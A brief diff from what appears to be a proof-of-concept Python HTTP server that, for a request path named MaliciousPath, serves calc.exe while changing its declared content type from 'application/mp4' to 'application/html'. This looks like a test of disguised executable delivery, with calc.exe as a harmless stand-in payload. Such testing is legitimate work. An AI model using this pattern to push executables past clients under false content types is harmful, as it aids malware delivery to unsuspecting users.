@@ -48,7 +48,7 @@ class MyServer(BaseHTTPRequestHandler):
             if self.path.endswith(MaliciousPath):
                 print('HERE')
                 self.send_response(200)
-                self.send_header('Content-type', 'application/mp4')
+                self.send_header('Content-type', 'application/html')
                 self.send_header('FileName', 'calc.exe')
                 self.end_headers()
                 with open(os.path.join(scriptDir+ "\\calc.exe"), 'rb') as file:
